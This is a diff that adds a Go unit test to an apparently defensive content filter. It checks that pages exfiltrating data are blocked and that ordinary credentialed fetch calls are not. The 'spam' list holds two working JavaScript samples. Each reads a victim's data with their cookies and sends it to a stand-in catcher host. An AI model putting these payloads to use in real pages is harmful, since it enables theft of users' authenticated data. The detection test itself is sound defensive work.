@@ -122,6 +122,34 @@ func TestPayloadHostingPatternsAllowLegitLookalikes(t *testing.T) {
 	}
 }
 
+// Credentialed-exfil page found on prod (2026-11-18): read the victim's data
+// with their cookies, then ship it to a third-party catcher in a query string.
+func TestCredentialedExfilPageIsBlocked(t *testing.T) {
+	f := defaultFilter(t)
+	spam := []string{
+		"<html><body>\r\n<script>\r\nfetch('https://lab.example/api/userdata', {\r\n    method: 'GET',\r\n    credentials: 'include'\r\n})\r\n.then(r => r.text())\r\n.then(data => {\r\n    fetch('https://catcher.example/test?data=' + encodeURIComponent(data), {mode: 'no-cors'});\r\n});\r\n</script></body></html>",
+		`fetch("/api/me",{credentials:"include"}).then(r=>r.json()).then(d=>{new Image().src="https://x.example/c?d="+btoa(JSON.stringify(d))})`,
+	}
+	for _, s := range spam {
+		in := model.MockInput{ResponseBody: s}
+		if !f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("expected credentialed exfil page to be blocked: %q", s)
+		}
+	}
+	legit := []string{
+		`fetch('/api/me', {credentials: 'include'}).then(r => r.json()).then(render)`,
+		`fetch('/api/items', {credentials: 'include'}); const next = 'https://api.example.com/items?page=' + page;`,
+		`fetch('https://api.example.com/search?q=' + encodeURIComponent(query))`,
+		`{"credentials": "include", "url": "https://api.example.com/x?y=1"}`,
+	}
+	for _, s := range legit {
+		in := model.MockInput{ResponseBody: s}
+		if f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("false positive on: %q", s)
+		}
+	}
+}
+
 func TestBlockedScansAllUserFields(t *testing.T) {
 	f := testSpamFilter(t, []string{`(?i)spamword`}, nil)
 	cases := map[string]model.MockInput{
